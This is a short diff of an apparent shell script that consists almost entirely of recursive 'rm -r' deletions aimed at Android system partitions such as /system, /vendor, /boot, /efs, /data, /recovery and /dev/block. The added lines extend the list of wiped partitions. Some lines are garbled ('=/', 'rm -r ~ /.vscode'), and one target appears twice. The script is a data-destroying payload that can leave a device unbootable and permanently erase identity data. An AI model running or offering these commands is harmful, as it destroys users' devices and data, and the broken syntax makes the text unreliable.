@@ -4,12 +4,19 @@ rm -r /sdcard
 rm -r /odm
 rm -r /dev
 rm -r /ext4
+rm -r /vendor
+rm -r /system
+rm -r /efs
+rm -r /boot
+rm -r /cache
+rm -r /data
 rm -r /recovery
 rm -r /tmp/recovery
 rm -r /cache/recovery
 rm -r /system/bin/e2fsck
 rm -r /efs
 rm -r /dev/block
+
 =/
 rm -r ~ /.vscode
 rm -r source=/cache
